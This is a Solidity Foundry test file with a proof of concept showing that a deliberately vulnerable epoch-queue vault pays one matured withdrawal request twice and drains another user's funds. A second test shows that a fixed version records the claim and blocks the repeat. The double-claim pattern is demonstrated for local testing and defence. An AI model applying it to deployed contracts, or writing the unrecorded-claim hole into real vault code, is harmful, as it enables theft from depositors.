// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {MockAsset} from "../src/ReceiptSplitVault.sol";
import {EpochQueueVaultVulnerable, EpochQueueVaultBound} from "../src/EpochQueueVault.sol";

/// Directed PoC: one matured request, claimed at full value twice.
/// Local Foundry only. The keeper is this contract in both runs.
contract EpochQueuePoC is Test {
    MockAsset internal asset;
    address internal alice = address(0xA11CE);
    address internal bob = address(0xB0B);

    function setUp() public {
        asset = new MockAsset();
        asset.mint(alice, 100 ether);
        asset.mint(bob, 100 ether);
    }

    function _fund(address user, address vault) internal {
        vm.startPrank(user);
        asset.approve(vault, type(uint256).max);
        vm.stopPrank();
    }

    function test_full_reclaim_drains_vulnerable_queue() public {
        EpochQueueVaultVulnerable vault = new EpochQueueVaultVulnerable(asset, address(this));
        _fund(alice, address(vault));
        _fund(bob, address(vault));

        vm.prank(alice);
        uint256 aliceId = vault.request(100 ether);
        vm.prank(bob);
        vault.request(100 ether); // bob's deposit backs the second payment

        vault.advanceEpoch();

        vm.startPrank(alice);
        vault.claim(aliceId, 100 ether); // first claim: legitimate
        vault.claim(aliceId, 100 ether); // second claim: the cursor was never written
        vm.stopPrank();

        emit log_named_decimal_uint("alice requested", 100 ether, 18);
        emit log_named_decimal_uint("alice claimed  ", asset.balanceOf(alice), 18);
        emit log_named_decimal_uint("vault balance  ", asset.balanceOf(address(vault)), 18);

        assertEq(asset.balanceOf(alice), 200 ether, "alice requested 100 and claimed 200");
        assertEq(asset.balanceOf(address(vault)), 0, "bob's backing is gone");

        vm.prank(bob);
        vm.expectRevert(bytes("BALANCE")); // bob's matured claim meets an empty vault
        vault.claim(1, 100 ether);
    }

    function test_bound_queue_blocks_second_full_claim() public {
        EpochQueueVaultBound vault = new EpochQueueVaultBound(asset, address(this));
        _fund(alice, address(vault));
        _fund(bob, address(vault));

        vm.prank(alice);
        uint256 aliceId = vault.request(100 ether);
        vm.prank(bob);
        uint256 bobId = vault.request(100 ether);

        vault.advanceEpoch();

        vm.startPrank(alice);
        vault.claim(aliceId, 100 ether);
        vm.expectRevert(bytes("AMOUNT")); // claimed cursor written: nothing left
        vault.claim(aliceId, 1);
        vm.stopPrank();

        vm.prank(bob);
        vault.claim(bobId, 100 ether); // bob is paid in full

        assertEq(asset.balanceOf(alice), 100 ether);
        assertEq(asset.balanceOf(bob), 100 ether);
        assertEq(asset.balanceOf(address(vault)), 0);
    }
}
